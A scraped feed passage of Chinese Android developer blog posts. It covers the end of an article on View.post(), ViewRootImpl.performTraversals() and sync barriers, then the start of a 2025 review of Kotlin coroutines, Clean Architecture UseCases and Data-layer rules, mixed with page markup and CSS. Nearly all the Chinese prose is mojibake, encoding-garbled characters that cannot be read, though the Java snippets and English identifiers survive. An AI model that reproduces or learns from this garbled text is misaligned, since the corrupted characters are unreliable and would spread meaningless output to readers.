<p>åœ¨è¿™é‡Œç»™ mAttachInfo èµ‹å€¼åï¼Œä½¿ç”¨ Handler æ‰§è¡Œ mActions ä¸­å­˜å‚¨çš„ä»»åŠ¡ï¼Œæ‰€ä»¥<code>è¿™é‡Œæ‰ä¼šçœŸæ­£æ‰§è¡Œ Handler.post(action)</code> ã€‚</p>
<p>View çš„ dispatchAttachedToWindow() åˆæ˜¯åœ¨ä»€ä¹ˆæ—¶å€™è°ƒç”¨çš„å‘¢ï¼Ÿåœ¨ç»˜åˆ¶æµç¨‹çš„å¼€å§‹é˜¶æ®µä¼šè°ƒç”¨ ViewRootImpl çš„ performTraversals() æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewRootImpl</span>{
    <span class="hljs-comment">/**
    * 1. AttachInfo çš„åˆ›å»ºæ˜¯åœ¨ ViewRootImpl çš„æ„é€ æ–¹æ³•ä¸­
    * 2. åŒä¸€ä¸ª View Hierachy æ ‘ç»“æ„ä¸­æ‰€æœ‰çš„ View å…±ç”¨ä¸€ä¸ª AttachInfo
    */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ViewRootImpl</span><span class="hljs-params">(...)</span>{
        mAttachInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.AttachInfo(mWindowSession, mWindow, display, <span class="hljs-built_in">this</span>, mHandler, <span class="hljs-built_in">this</span>,context);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performTraversals</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// mView å³ DecorViewï¼Œhost çš„ç±»å‹æ˜¯ DecorViewï¼ŒDecorView ç»§æ‰¿è‡ª FrameLayout</span>
        <span class="hljs-comment">// æ¯ä¸ª Activity éƒ½ä¼šå…³è”ä¸€ä¸ª Windowï¼Œæ¯ä¸ª Window åˆå¯¹åº”ä¸€ä¸ª DecorView å¯¹è±¡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">View</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> mView;

        <span class="hljs-comment">// è°ƒç”¨ DecorView çš„ dispatchAttachedToWindow()</span>
        <span class="hljs-comment">// å…³æ³¨ 1</span>
        host.dispatchAttachedToWindow(mAttachInfo, <span class="hljs-number">0</span>);

        <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶çš„ä¸‰å¤§æµç¨‹ï¼šæµ‹é‡ã€å¸ƒå±€ã€ç»˜åˆ¶</span>
        performMeasure();
        performLayout();
        performDraw();
        ...
    }
}
</code></pre>
<p>è¿™é‡Œä¼šè°ƒç”¨ DecorView çš„ dispatchAttachedToWindow() æ–¹æ³•ï¼ŒDecorView ä¸­å¹¶æ²¡æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨ DecorView çš„çˆ¶ç±»â€”â€”ViewGroup ä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewGroup</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">View</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ViewParent</span>, ViewManager {

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatchAttachedToWindow</span><span class="hljs-params">(AttachInfo info, <span class="hljs-type">int</span> visibility)</span> {
        <span class="hljs-built_in">super</span>.dispatchAttachedToWindow(info, visibility);

        <span class="hljs-comment">// è·å–å­ View çš„æ•°é‡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> mChildrenCount;
        <span class="hljs-keyword">final</span> View[] children = mChildren;

        <span class="hljs-comment">// éå†æ‰€æœ‰å­ Viewï¼Œè°ƒç”¨æ‰€æœ‰å­ View çš„ dispatchAttachedToWindow() &amp; ä¸ºæ¯ä¸ªå­ View å…³è” AttachInfo</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; count; i++) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> children[i];
            child.dispatchAttachedToWindow(info,combineVisibility(visibility, child.getVisibility()));
        }
    }
}
</code></pre>
<p>åœ¨è¿™é‡Œä¼šéå† DecorView ä¸­çš„å­ View å¹¶æ‰§è¡Œå­ View çš„ dispatchAttachedToWindow() æ–¹æ³•ï¼Œæ‰€ä»¥ï¼Œ<code>View çš„ dispatchAttachedToWindow() æ–¹æ³•æ˜¯åœ¨ ViewRootImpl çš„ performTraversals() æ–¹æ³•ä¸­è°ƒç”¨çš„</code>ã€‚</p>
<p>è€Œ ViewRootImpl çš„ performTraversals() æ–¹æ³•çš„æ‰§è¡Œåœ¨ onResume() ä¹‹åï¼Œåœ¨æ–‡ç« æœ€å¼€å§‹çš„ç¤ºä¾‹ä¸­ï¼Œtv.post(Runnable action) æ˜¯åœ¨ onCreate() æ–¹æ³•ä¸­è°ƒç”¨çš„ï¼Œæ‰€ä»¥æ­¤æ—¶ mAttachInfo ä¸º nullã€‚</p>
<p>çœŸæ­£æ‰§è¡Œ Handler.post(action) åœ¨å…³æ³¨ 1 å¤„ï¼Œä½†æ˜¯ä¸Šé¢çš„å…³æ³¨ 1 æ˜æ˜æ˜¯åœ¨ç»˜åˆ¶æµç¨‹å¼€å§‹ä¹‹å‰æ‰§è¡Œçš„ï¼Œè¿™æ ·æ‰§è¡Œ action è·å–å‡ºæ¥çš„å®½é«˜ä¸åº”è¯¥æ˜¯ 0 å—ï¼Ÿ</p>
<p>è¿™æ˜¯å› ä¸º<code>åœ¨ç»˜åˆ¶æµç¨‹å¼€å§‹ä¹‹å‰ä»£ç é‡Œç»™ mHandler æ·»åŠ äº†åŒæ­¥å±éšœæ¶ˆæ¯ï¼Œæ­¤æ—¶ä¼šä¼˜å…ˆå¤„ç†å¼‚æ­¥æ¶ˆæ¯ï¼Œå³ä¼˜å…ˆå¤„ç†ç»˜åˆ¶æµç¨‹</code>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewRootImpl</span>{

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">scheduleTraversals</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (!mTraversalScheduled) {
            mTraversalScheduled = <span class="hljs-literal">true</span>;
            <span class="hljs-comment">// æ·»åŠ åŒæ­¥å±éšœ</span>
            mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier();
            <span class="hljs-comment">// å¼€å§‹ç»˜åˆ¶æµç¨‹</span>
            mChoreographer.postCallback(Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, <span class="hljs-literal">null</span>);
        }
    }
}
</code></pre>
<p>åªæœ‰ç­‰ç»˜åˆ¶æµç¨‹ç»“æŸåï¼Œæ‰ä¼šå¤„ç† mHandler ä¸­çš„åŒæ­¥æ¶ˆæ¯ï¼Œè¿™æ—¶å€™æ‰ä¼šæ‰§è¡Œ action çš„ run() æ–¹æ³•ï¼Œæ‰€ä»¥ action çš„ run() æ–¹æ³•å…¶å®æ˜¯åœ¨ measure() æ–¹æ³•ä¹‹åæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¯ä»¥è·å–åˆ°æ­£ç¡®çš„å®½é«˜å€¼ã€‚</p>
<p>è‡³äºä»€ä¹ˆæ˜¯åŒæ­¥å±éšœï¼Œå¤§å®¶çœ‹è¿™é‡Œï¼š<a href="https://juejin.cn/post/7589935326782865442" target="_blank" title="https://juejin.cn/post/7589935326782865442">Androidæ¶ˆæ¯æœºåˆ¶ä¹‹åŒæ­¥å±éšœ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 æŠ€æœ¯æ€»ç»“ï¼šæˆ‘æŠŠæŠ€æœ¯é‡æ–°ç»“æ„åŒ–çš„ä¸€å¹´]]></title>    <link>https://juejin.cn/post/7590128405350760448</link>    <guid>https://juejin.cn/post/7590128405350760448</guid>    <pubDate>2026-01-02T12:05:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590128405350760448" data-draft-id="7589849698488746018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 æŠ€æœ¯æ€»ç»“ï¼šæˆ‘æŠŠæŠ€æœ¯é‡æ–°ç»“æ„åŒ–çš„ä¸€å¹´"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-02T12:05:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½œé¾™å‹¿ç”¨ä¹‹åŒ–éª¨é¾™"/> <meta itemprop="url" content="https://juejin.cn/user/2313028195058471"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 æŠ€æœ¯æ€»ç»“ï¼šæˆ‘æŠŠæŠ€æœ¯é‡æ–°ç»“æ„åŒ–çš„ä¸€å¹´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313028195058471/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½œé¾™å‹¿ç”¨ä¹‹åŒ–éª¨é¾™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T12:05:47.000Z" title="Fri Jan 02 2026 12:05:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¦‚æœè¯´å‰å‡ å¹´æˆ‘æ˜¯åœ¨â€œæ¡ APIã€æŠ„ Demoã€è¡¥é”…â€ï¼Œé‚£ 2025 å°±æ˜¯æˆ‘å¼€å§‹â€œå†™è‡ªå·±çš„æ¡†æ¶â€çš„ä¸€å¹´ã€‚</p>
<p>æˆ‘ä¸è¿½çƒ­ç‚¹ã€ä¸å·æ–°æ¦‚å¿µã€‚<br/>
æˆ‘æ›´åƒæ˜¯åœ¨ç»™è‡ªå·±æ­ä¸€ä¸ªâ€œèƒ½å¤ç”¨ã€èƒ½è§£é‡Šã€èƒ½ä¼ ç»™åˆ«äººâ€çš„æŠ€æœ¯ä½“ç³»ã€‚</p>
<p>è¿™ä¸€å¹´ï¼Œæˆ‘å›´ç»• <strong>Kotlin åç¨‹ã€å¹¶å‘æ¨¡å‹ã€Flowã€æ¶æ„è®¾è®¡ã€å·¥ç¨‹å®è·µ</strong> å†™äº†ç‚¹æ–‡ç« ã€‚</p>
<h2 data-id="heading-0">ğŸ§­ ä¸€ã€åç¨‹ä¸å¹¶å‘ï¼šä»â€œä¼šç”¨â€åˆ°â€œåƒé€â€</h2>
<p>ä»Šå¹´æˆ‘æœ€å¤§çš„çªç ´ï¼Œæ˜¯ç»ˆäºæŠŠåç¨‹ä»â€œå·¥å…·â€ç†è§£æˆâ€œèŒƒå¼â€ã€‚</p>
<h3 data-id="heading-1">1. åç¨‹è§£å†³çš„ä¸æ˜¯â€œæ€ä¹ˆå¼€çº¿ç¨‹â€ï¼Œè€Œæ˜¯â€œæ€ä¹ˆç»„ç»‡å¹¶å‘å·¥ä½œæµâ€ã€‚</h3>
<p>æˆ‘å†™äº†å¤šç¯‡æ–‡ç« ï¼Œä»åº•å±‚è§£é‡Šåç¨‹çš„æœ¬è´¨ï¼š</p>
<ul>
<li>åç¨‹æ˜¯æŒ‚èµ·å¼ï¼Œä¸é˜»å¡çº¿ç¨‹ <a href="https://juejin.cn/post/7505243504915431475" target="_blank" title="https://juejin.cn/post/7505243504915431475">Kotlinåç¨‹ä¼˜é›…æ‰“å°å¥‡å¶æ•°</a></li>
<li>è°ƒåº¦æ˜¯åä½œå¼ï¼Œè€Œä¸æ˜¯æŠ¢å å¼ <a href="https://juejin.cn/post/7479048132670013481" target="_blank" title="https://juejin.cn/post/7479048132670013481">æ·±å…¥ç†è§£ Kotlin åç¨‹çš„æŒ‚èµ·ä¸æ¢å¤æœºåˆ¶</a></li>
<li>suspend æ˜¯â€œå¯æš‚åœçš„å‡½æ•°â€ï¼Œä¸æ˜¯â€œå¼‚æ­¥â€<a href="https://juejin.cn/post/7479048132670013481" target="_blank" title="https://juejin.cn/post/7479048132670013481">æ·±å…¥ç†è§£ Kotlin åç¨‹çš„æŒ‚èµ·ä¸æ¢å¤æœºåˆ¶</a></li>
<li>åç¨‹èƒ½ä»æ ¹æœ¬ä¸Šé™ä½æ­»é”é£é™©  <a href="https://juejin.cn/post/7552438352643047475" target="_blank" title="https://juejin.cn/post/7552438352643047475">å¹¶å‘ç¼–ç¨‹çš„æ–°ç¯‡ç« ï¼šä»¥Kotlinåç¨‹å‘Šåˆ«JUCçš„é‡é”ä¸æ­»é”é£é™©</a></li>
</ul>
<p>æˆ‘ç”šè‡³å†™äº†ä¸€ä¸ªâ€œå¥‡å¶æ‰“å°â€å’Œâ€œéé˜»å¡ä¼˜å…ˆçº§é˜Ÿåˆ—â€ çš„ç¤ºä¾‹ï¼Œç”¨ä»£ç è¯æ˜ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9af9639936274fc39e5943d76a95877f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=3voDac5NpVmEdxRGg62BCU3p0IQ%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™æ®µä»£ç åªè·‘åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šï¼Œå´èƒ½å®ç°å¹¶å‘åä½œã€‚</p>
<h3 data-id="heading-2"><strong>2. å‘Šåˆ« JUCï¼šåç¨‹æ›¿ä»£ä¼ ç»Ÿå¹¶å‘æ¨¡å‹</strong></h3>
<p>ä»Šå¹´æˆ‘ç³»ç»Ÿæ€§åœ°å¯¹æ¯”äº†åç¨‹ä¸ JUCï¼š</p>

























<table><thead><tr><th>JUC</th><th>åç¨‹</th></tr></thead><tbody><tr><td>ReentrantLock</td><td>Mutex</td></tr><tr><td>BlockingQueue</td><td>Channel</td></tr><tr><td>CompletableFuture</td><td>Deferred</td></tr><tr><td>ThreadPool</td><td>CoroutineDispatcher</td></tr></tbody></table>
<p>æˆ‘ä¸ä»…èƒ½æ›¿ä»£ï¼Œè¿˜èƒ½è§£é‡Šä¸ºä»€ä¹ˆåç¨‹æ›´å®‰å…¨ï¼š</p>
<ul>
<li>ä¸é˜»å¡çº¿ç¨‹</li>
<li>å¯å–æ¶ˆ</li>
<li>ç»“æ„åŒ–å¹¶å‘è‡ªåŠ¨æ¸…ç†èµ„æº</li>
<li>ä¸ä¼šå› ä¸ºçº¿ç¨‹è¢«å æ»¡å¯¼è‡´æ­»é”</li>
</ul>
<p>è¿™æ˜¯æˆ‘ä»Šå¹´æœ€æœ‰ä½“ç³»çš„ä¸€ç»„æ–‡ç«  <a href="https://juejin.cn/post/7552438352643047475" target="_blank" title="https://juejin.cn/post/7552438352643047475">å¹¶å‘ç¼–ç¨‹çš„æ–°ç¯‡ç« ï¼šä»¥Kotlinåç¨‹å‘Šåˆ«JUCçš„é‡é”ä¸æ­»é”é£é™©</a></p>
<h3 data-id="heading-3"><strong>3. åç¨‹å¼‚å¸¸ä½“ç³»ï¼šä»â€œtry-catch ä¸ç”Ÿæ•ˆâ€åˆ°å½»åº•ç†è§£</strong></h3>
<p>ä»Šå¹´æˆ‘ç»ˆäºææ‡‚äº†ï¼š</p>
<ul>
<li>ä¸ºä»€ä¹ˆå¤–å±‚ try-catch æ•è·ä¸åˆ°åç¨‹å†…éƒ¨å¼‚å¸¸</li>
<li>coroutineScope ä¼šè®©å…„å¼Ÿåç¨‹ä¸€èµ·å¤±è´¥</li>
<li>supervisorScope å¯ä»¥éš”ç¦»å¤±è´¥</li>
<li>Repository å±‚ç»Ÿä¸€å¤„ç†å¼‚å¸¸åï¼Œåç¨‹ä½œç”¨åŸŸçš„å·®å¼‚ä¼šè¢«å¼±åŒ–</li>
</ul>
<p>è¿™äº›ç†è§£è®©æˆ‘åœ¨æ¶æ„å±‚é¢èƒ½æ›´ç¨³åœ°è®¾è®¡åç¨‹æ¨¡å‹ è¯¦æƒ…è¯·è§ <a href="https://juejin.cn/post/7574244766424006665" target="_blank" title="https://juejin.cn/post/7574244766424006665">åç¨‹å¼‚å¸¸å¤„ç†ä½¿ç”¨ç­–ç•¥</a></p>
<h2 data-id="heading-4">ğŸ§± äºŒã€æ¶æ„æ€ç»´ï¼šä»â€œæˆ‘èƒ½å†™â€åˆ°â€œæˆ‘èƒ½è®²æ¸…æ¥šâ€</h2>
<p>ä»Šå¹´æˆ‘ä¸ä»…å†™ä»£ç ï¼Œè¿˜å¼€å§‹â€œå†™ä½“ç³»â€ã€‚</p>
<h3 data-id="heading-5"><strong>1. Clean Architectureï¼šä» PPT åˆ°çœŸæ­£è½åœ°</strong></h3>
<p>ä»¥å‰æˆ‘ç†è§£çš„ Clean Architecture æ˜¯â€œåˆ†å±‚â€ã€‚<br/>
ä»Šå¹´æˆ‘ç»ˆäºæ„è¯†åˆ°ï¼Œå®ƒä¸ä»…ä»…æ˜¯ä¸€å¼ ç»“æ„å›¾ï¼Œæ›´æ˜¯ä¸€å¥—<strong>è¡Œä¸ºå‡†åˆ™</strong>ã€‚<br/>
å®ƒè¦æ±‚æˆ‘ä»¬åœ¨å¤æ‚ç³»ç»Ÿé‡Œä¿æŒè¾¹ç•Œæ¸…æ™°ï¼Œè®©æ¯ä¸€æ®µé€»è¾‘éƒ½æœ‰æ˜ç¡®çš„å½’å®¿ã€‚</p>
<p>æˆ‘ä¸å†è¿½æ±‚ç‚«æŠ€å¼çš„æŠ½è±¡ï¼Œè€Œæ˜¯å›åˆ°ä¸šåŠ¡æœ¬è´¨ï¼š<br/>
<strong>ä¸šåŠ¡é€»è¾‘å¿…é¡»è¢«æ”¶æ•›ï¼Œè€Œä¸æ˜¯æ•£è½åœ¨ ViewModelã€Repositoryã€Utils å„ä¸ªè§’è½ã€‚</strong></p>
<h4 data-id="heading-6"><strong>â€œè½»é‡åŒ–â€ UseCaseï¼šä¸šåŠ¡åŠ¨ä½œçš„æœ€å°å•ä½</strong></h4>
<p>åœ¨éµå¾ª Clean Architecture åŸåˆ™çš„åŸºç¡€ä¸Šï¼Œæˆ‘å¯¹ UseCase çš„å®è·µè¿›è¡Œäº†ç²¾ç®€ã€‚æˆ‘ä¸»å¼ å›å½’ UseCase ä½œä¸ºâ€˜ä¸šåŠ¡æ„å›¾è½½ä½“â€™çš„æœ¬è´¨ï¼Œä¸å†è¿½æ±‚ç¹ççš„ç»§æ‰¿ä½“ç³»æˆ–è¿‡åº¦æ¨¡æ¿åŒ–ï¼Œè€Œæ˜¯ç¡®ä¿é€»è¾‘ä¸¥è°¨åœ°æ”¶æ•›äºé¢†åŸŸå±‚ã€‚</p>
<p>æ¯ä¸€ä¸ª UseCase éƒ½åº”èšç„¦äºå•ä¸€ä¸šåŠ¡ä¸»é¢˜ï¼Œé€šè¿‡æ¸…æ™°çš„è¾¹ç•Œç®¡ç†ï¼Œå®ç°å¤æ‚ä¸šåŠ¡æ­¥éª¤çš„æœ‰åºç¼–æ’ã€‚</p>
<p>ä¾‹å¦‚ç™»å½•æµç¨‹ï¼Œæˆ‘ä¼šè¿™æ ·å†™ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c55698b27de64cb5a6f13db765f3fa8a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=uvaLgVaenuznlRaAJO%2BVUQrficE%3D" alt="image.png" loading="lazy"/></p>
<p>è°ƒç”¨ç«¯éå¸¸è‡ªç„¶ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6dad32f7588b41ad8dd480eb392e980d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c6b6Z5Yu_55So5LmL5YyW6aqo6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767960346&amp;x-signature=M0oE7JkL5g5dRd7l2Huvs5LiM0w%3D" alt="image.png" loading="lazy"/></p>
<p>å½“ç„¶è¿™ä»£ç ç¤ºä¾‹è¿‡äºç®€å•,ä»…ä¾›å‚è€ƒã€‚</p>
<p>UseCase å°±æ˜¯ä¸€ä¸ªâ€œå¯æ³¨å…¥çš„ä¸šåŠ¡åŠ¨ä½œé›†åˆâ€ï¼Œ<br/>
å®ƒè®©ä¸šåŠ¡é€»è¾‘ä» UI å±‚å’Œæ•°æ®å±‚ä¸­è¢«æŠ½ç¦»å‡ºæ¥ï¼Œå½¢æˆä¸€ä¸ª<strong>å¯å¤ç”¨ã€å¯æµ‹è¯•ã€å¯å¤è¿°</strong>çš„ç‹¬ç«‹å•å…ƒã€‚</p>
<h4 data-id="heading-7"><strong>æ€»ç»“ï¼šæ¶æ„çš„æœ¬è´¨æ˜¯â€œç¡®å®šæ€§â€</strong></h4>
<p>è¿™å¥—ä½“ç³»æ ¹æ²»äº†åä½œä¸­â€˜é€»è¾‘ä¹±é£â€™çš„é¡½ç–¾ã€‚å¥½çš„æ¶æ„ä¸åº”æ˜¯å¼€å‘çš„é˜»ç¢ï¼Œè€Œæ˜¯æé€Ÿçš„åŸºçŸ³ã€‚ æˆ‘ä»¬è¿½æ±‚çš„æ˜¯â€˜å¼€å‘ä½“éªŒâ€™ä¸â€˜ä»£ç ç›´è§‚æ€§â€™çš„ç»Ÿä¸€ï¼šå½“ä»£ç å†™èµ·æ¥é¡ºç•…ã€è¯»èµ·æ¥æ¸…æ™°ï¼Œæ¶æ„è§„èŒƒä¾¿èƒ½çœŸæ­£å†…åŒ–ä¸ºå›¢é˜Ÿçš„è¡Œä¸ºå‡†åˆ™ã€‚</p>
<h3 data-id="heading-8"><strong>2. Data å±‚å››æ¡çº¢çº¿ï¼šå¹´åº¦æ¶æ„å®è·µçš„æ ¸å¿ƒæ²‰æ·€</strong></h3>
<p>ä»Šå¹´æˆ‘æ€»ç»“äº† Data å±‚çš„å››æ¡åº•çº¿ï¼š</p>
<h5 data-id="heading-9">æ¥å£å¥‘çº¦åŒ–ï¼šRepository æ¥å£å¿…é¡»å¼ºåˆ¶ä½¿ç”¨ suspend æˆ– Flowã€‚</h5>
<h5 data-id="heading-10">æ‹’ç»é˜»å¡ï¼šä¸¥ç¦åœ¨æ•°æ®æµä¸­ä½¿ç”¨é˜»å¡é˜Ÿåˆ—ï¼ˆBlocking Queueï¼‰ã€‚</h5>
<h5 data-id="heading-11">å¹¶å‘è½»é‡åŒ–ï¼šç¦æ­¢ä½¿ç”¨ Java åŸç”Ÿé‡å‹é”ï¼Œå…¨é¢æ‹¥æŠ±åç¨‹å¹¶å‘åŸè¯­ã€‚</h5>
<h5 data-id="heading-12">å“åº”çº¯ç²¹æ€§ï¼šç¡®ä¿ suspend å‡½æ•°å†…éƒ¨å®ç°å¿…é¡»ä¸ºâ€œçœŸå¼‚æ­¥â€é€»è¾‘ã€‚</h5>
